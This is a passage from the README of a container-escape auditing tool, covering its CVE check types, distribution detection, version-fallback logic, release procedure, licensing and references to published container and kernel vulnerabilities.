| `compound` | Runs the version verdict plus module and socket checks and synthesises a combined severity across four states: module currently loaded ⇒ CRITICAL regardless of blacklist; socket reachable with no effective module gate (no module test configured, or the module isn't blacklisted) ⇒ CRITICAL; socket reachable but the module is *confirmed* blacklisted ⇒ HIGH, not CRITICAL — the socket check only proves the socket family is reachable (e.g. AF_ALG core), not that the specific blacklisted transform can load, so a real blacklist is recognised as a genuine (if not bind()-level-verified) mitigation rather than discarded; otherwise HIGH/MEDIUM as before. A *defer*/*unknown* version verdict yields a "verify" finding rather than a clean pass. |
| `manual` | Advisory/tracking entry for runtime or userspace CVEs that do not reduce to a kernel test. Emits a finding at the configured `severity` for inventory; live detection is handled by a dedicated script check named in the entry's `rec`/`notes`. Optional `component` / `component_affected` / `component_fixed` keys document the affected package version. A `manual` entry may also carry version fields (e.g. cgroup CVE-2022-0492), which the engine surfaces as a **supporting** signal alongside the behavioural verdict. For `component=runc` entries specifically (CVE-2019-5736, CVE-2024-21626), the dispatch first checks whether check 52 already established a live runc version elsewhere in the run and, if so, renders a **definitive** verdict instead of the static advisory. |

### Architecture-specific CVEs

Some CVEs only affect one CPU architecture — for example **ITScape (CVE-2026-46316)** is arm64-only, and **Januscape (CVE-2026-53359)** is x86_64-only (it lives in KVM's Intel/AMD shadow-MMU code path, which arm64 KVM doesn't share). Add an `arch=` key to gate the entry:

```ini
arch=arm64    # or x86_64, etc.  Aliases (aarch64/arm64, amd64/x86_64) are normalised.
```

When `arch=` is present and does not match `uname -m`, the engine reports the CVE as **N/A (INFO)** on that host instead of running the version/module/socket test — preventing a false positive on kernel version alone. Entries without an `arch=` key (or with `arch=any`) are tested on every architecture, as before. The companion script check 51 performs a complementary architecture-aware probe that further distinguishes an arm64 KVM *host* from a *guest* vantage point.

### Container OS / distribution support

The version-verdict engine detects the running distribution from `/etc/os-release`'s `ID=` field and normalizes it against the vendor tokens used in `distro_status` / `vendor_defer`. Coverage as of v4.6:

| `/etc/os-release` `ID=` | Resolves to | Notes |
|---|---|---|
| `ubuntu` | `ubuntu` | Direct match; `ABI.upload` version comparator |
| `debian` | `debian` | Direct match; release resolved via `VERSION_CODENAME` (bookworm/bullseye/trixie), `dpkg`-correct comparator |
| `rhel` | `rhel` | Direct match |
| `fedora` | `fedora` | Direct match (also covers Fedora CoreOS, which reports `ID=fedora`) |
| `almalinux` | `almalinux` | Direct match |
| `amzn` | `amazon` | Normalized — Amazon Linux 2 and 2023 both report `ID=amzn`, not `amazon`, which previously made every `amazon\|...` row silently unreachable |
| `sles`, `sled`, `opensuse-leap`, `opensuse-tumbleweed` | `suse` | Normalized |
| `ol` | `oracle` | Normalized (no `oracle\|...` conf rows exist yet; ready when added) |
| `rhcos` (OpenShift nodes) | `openshift`, aliased to `rhel` | Dual-matched: an `openshift\|...` row is checked first, falling back to a plain `rhel\|...` row, since RHCOS is genuinely RHEL-based (`ID_LIKE="rhel fedora"`, confirmed against Red Hat's own documentation) but also carries OpenShift-specific advisories in the conf. **Caveat:** `distro_status` rows that key on release number are not reliably matched for RHCOS, since its `VERSION_ID` is the OpenShift version (e.g. `4.18`), not a RHEL release number — mapping OCP versions to underlying RHEL majors isn't derivable from `/etc/os-release` alone. `vendor_defer` rows (id-only, no release check) are unaffected by this and match correctly. |
| `azurelinux` (AKS nodes, Azure Linux 3.0+), `mariner` (legacy CBL-Mariner 1.0/2.0) | `azurelinux` | Both normalize to one token. Confirmed directly against a real `/etc/os-release` (via a systemd/mkosi bug report): Azure Linux 3.0+ reports `ID=azurelinux`; older CBL-Mariner releases reported `ID=mariner`. RPM-based (`tdnf`), Fedora-derived from v4.0 onward, with a general-purpose shell — unlike Bottlerocket/Talos below, the `rmmod`/`modprobe.d` mitigation commands in this conf should work on it. No `distro_status`/`vendor_defer` rows reference `azurelinux` yet, so version checks fall through to the heuristic upstream-version fallback described below until distro-specific data is added. |

**Known gaps — flagged rather than silently assumed to work:**
- **Alpine** — kernel-version comparison should function (it only reads `uname -r`), but this hasn't been verified end-to-end against a real Alpine host, and any recommendation text assuming `apt`/`yum`/`dnf` package managers won't apply (Alpine uses `apk`).
- **Bottlerocket, Talos** — intentionally immutable, container-only host OSes with no general-purpose shell or package manager by design. The `rmmod` / `/etc/modprobe.d` mitigation commands this tool recommends **do not apply** on these hosts — they need an image-level or admin-container remediation path that this version does not generate. Treat any finding on these platforms as "patch the kernel," not "apply the interim mitigation."
- **Flatcar, Photon OS, Rocky Linux, CentOS Stream** — no `distro_status`/`vendor_defer` rows reference these distributions yet in `cve_checks.conf`, and their `ID=` values have not been individually verified against the normalization map (Rocky/CentOS report `ID=rocky`/`ID=centos` and should pass through unnormalized/unmatched rather than mis-map to another distro, but this hasn't been tested on a real host). Distro-kernel version checks on these fall through to the heuristic fallback below rather than a distro-specific verdict.

**Heuristic fallback for unmatched distro kernels.** When a distro-packaged kernel has no matching `distro_status`/`vendor_defer` row — whether because the distro genuinely isn't covered yet, or a specific release is missing (this is how the missing `ubuntu|24.04|...` row for Copy Fail, CVE-2026-31431, was found) — the engine no longer returns a bare `unknown` with zero supporting signal. It compares the running kernel's base version (e.g. `6.17.0`, stripped of the distro suffix) against the CVE's NVD `upstream_ranges` and, depending on how far past the fix it is, does one of two things:

- **Same mainline series as the fix** (e.g. running `6.16.50` when the fix landed at `6.16.1`): surfaced as clearly-labeled, non-authoritative context only, never promoted to a verdict. Distro point-release numbering doesn't track upstream stable's 1:1 within a series, so this genuinely is just a heuristic that can be wrong in either direction.
- **A full mainline series past the fix** (e.g. running `6.17.x` when the fix landed in the `6.16` series): promoted to a confident `not-affected` verdict, not just an annotated `unknown`. kernel.org mainline releases are strictly cumulative — a distro's `6.17`-based kernel is necessarily built on top of everything already in `6.16`, since packagers build from an upstream tag and layer patches on top rather than forking away from upstream history. This is categorically different from same-series proximity and is safe to treat as a real answer rather than a guess.

A follow-up audit across all kernel-testable CVEs after adding this also found three long-standing entries — **DirtyCOW (CVE-2016-5195)**, **Flipping Pages (CVE-2024-1086)**, and **OverlayFS SetUID Copy-Up (CVE-2023-0386)** — whose `vendor_defer` fields pointed Ubuntu/Debian at a `see-distro_status` placeholder that didn't actually exist in those entries. Because `vendor_defer` is checked *before* this heuristic fallback, that dead-end silently prevented the promotion logic above from ever running for those three CVEs on Ubuntu/Debian, regardless of how far past the (very old) fix the kernel actually was. The dangling tokens have been removed so those hosts now correctly fall through to the heuristic/promotion path.

### Keeping the database current

Version `cve_checks.conf` separately from the script. When a distribution ships a patch for a listed CVE, add the version to `fixed_versions` for that entry. When in-the-wild status changes, update `itw=`. A suggested workflow:

```bash
# Pull the latest database from the repo
curl -sO https://raw.githubusercontent.com/liamromanis101/K8s-container_escape_audit/main/cve_checks.conf
```

## Releasing (maintainers)

Releases are cut as Git tags matching `v*`, which triggers the SLSA provenance workflow. The workflow hashes both release artifacts, generates a signed `multiple.intoto.jsonl` attestation, and attaches it to the GitHub release.

**Before tagging**, update the two small files `--check-updates` reads (both live at the repo root):

```bash
# release.txt: bare script version, matching SCRIPT_VERSION in container_escape_audit.sh
echo "4.7" > release.txt

# cve_release.txt: bare date, matching the "# Last updated:" trailer in cve_checks.conf
echo "2026-07-20" > cve_release.txt

git add release.txt cve_release.txt
git commit -m "Bump release.txt and cve_release.txt for vX.Y"
```

If either file is forgotten, `--check-updates` will under- or over-report what's available — e.g. `release.txt` left at the old version makes every subsequent run report `[Script]: No` even after a real release ships. There's no automated check for this drift yet; treat it as a manual step alongside bumping `SCRIPT_VERSION` in the script itself.

```bash
# Cut a new release from main (creates the tag, the release, and fires provenance)
gh release create vX.Y --target main --generate-notes

# Watch the provenance workflow
gh run watch

# Confirm the signed provenance attached to the release
gh api repos/liamromanis101/K8s-container_escape_audit/releases/tags/vX.Y \
  --jq '.assets[].name'   # expect: multiple.intoto.jsonl
```

Two points worth remembering: the provenance generator is **tag-triggered**, so the workflow runs on the tag push (not on a plain "release created" event); and a Git tag freezes the workflow file as it existed at that commit, so always land workflow fixes on `main` before cutting the tag.

## Contributing

When adding a new check function:

1. Add a `check_<name>()` function to the script
2. Call `add_finding` with all seven fields: id, severity, title, what, impact, exploitability, recommendation
3. Register the function call in the relevant MAIN section
4. Update the checks table in this README

To add or update a CVE, edit `cve_checks.conf` only — no script changes needed.

## Legal

For authorised security testing only. Running this against systems without explicit written permission from the system owner may be illegal in your jurisdiction. No liability is accepted for misuse.

Copyright (c) 2026 Liam Romanis. Licensed under [CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/) — free for non-commercial use with attribution. See [LICENSE](LICENSE) for full terms.

### Commercial use

This tool is free for personal use, internal security assessments, open-source projects, and non-profit work. If you are using it as part of a commercial engagement — for example as a consultant billing a client, or as a component of a paid product or service — commercial use terms apply under CC BY-NC 4.0.

We are happy to discuss sponsorship arrangements for commercial users. Sponsorship helps fund continued development, CVE database maintenance, and new check coverage. If you or your organisation would like to support the project in exchange for commercial use rights, please reach out:

**GitHub Sponsors:** [github.com/sponsors/liamromanis101](https://github.com/sponsors/liamromanis101)

Sponsorship does not grant exclusivity or any change to the open licence for non-commercial users.

## References

- [Linux Capabilities man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [GTFOBins](https://gtfobins.github.io/)
- [Kubernetes Pod Security Admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [SLSA — Supply-chain Levels for Software Artifacts](https://slsa.dev/)
- [slsa-verifier](https://github.com/slsa-framework/slsa-verifier)
- [CVE-2026-31431 Copy Fail](https://en.wikipedia.org/wiki/Copy_Fail)
- [CVE-2026-46333 Ptrace credential hijack (Qualys TRU)](https://blog.qualys.com/vulnerabilities-threat-research/2026/05/20/cve-2026-46333-local-root-privilege-escalation-and-credential-disclosure-in-the-linux-kernel-ptrace-path)
- [CVE-2026-23111 nf_tables UAF](https://securityarsenal.com/blog/cve-2026-23111-linux-kernel-nftables-privilege-escalation-detection-and-hardening)
- [CVE-2026-46300 Fragnesia](https://ubuntu.com/blog/fragnesia-linux-vulnerability-fixes-available)
- [CVE-2026-43284 / CVE-2026-43500 Dirty Frag](https://www.openwall.com/lists/oss-security/2026/05/)
- [CVE-2026-43503 DirtyClone (JFrog Security Research)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [CVE-2026-46331 pedit COW (Debian DSA-6355-1)](https://security-tracker.debian.org/tracker/CVE-2026-46331)
- [CVE-2024-1086 Flipping Pages](https://github.com/Notselwyn/CVE-2024-1086)
- [CVE-2025-23266 NVIDIAScape](https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape)
- [CVE-2025-31133 runc masked path](https://www.cncf.io/blog/2025/11/28/runc-container-breakout-vulnerabilities-a-technical-overview/)
- [CVE-2026-46316 ITScape — KVM/arm64 guest-to-host escape](https://seclists.org/oss-sec/2026/q2/877)
- [CVE-2026-43121 io_uring zcrx freelist OOB](https://seclists.org/oss-sec/2026/q2/444)
- [CVE-2022-47939 ksmbd UAF RCE (Wiz)](https://www.wiz.io/blog/cve-2022-47939-critical-vulnerability-linux-kernel-ksmbd-module-everything-you-ne)
- [CVE-2026-41326 Kata CopyFile symlink subversion](https://github.com/kata-containers/kata-containers/security/advisories/GHSA-q49m-57vm-c8cc)
- [CVE-2026-46680 containerd runAsNonRoot bypass](https://github.com/containerd/containerd/security/advisories/GHSA-fqw6-gf59-qr4w)
- [CVE-2026-41579 runc /dev symlink](https://github.com/opencontainers/runc/security/advisories/GHSA-xjvp-4fhw-gc47)
- [CVE-2022-0847 DirtyPipe](https://dirtypipe.cm4all.com/)
- [CVE-2019-5736 runc escape](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
- [CVE-2024-21626 Leaky Vessels (Snyk Labs)](https://labs.snyk.io/resources/cve-2024-21626-runc-process-cwd-container-breakout/)
- [Felix Wilhelm's cgroup release_agent PoC](https://twitter.com/_fel1x/status/1151487051986087936)
- [deepce](https://github.com/stealthcopter/deepce)
- [CDK](https://github.com/cdk-team/CDK)
- [Trail of Bits — Understanding and Hardening Linux Containers](https://github.com/trailofbits/publications/blob/master/papers/understanding_hardening_linux_containers.pdf)
- [CVE-2026-43494 PinTheft (V12 Security PoC)](https://github.com/v12-security/pocs/tree/main/pintheft)
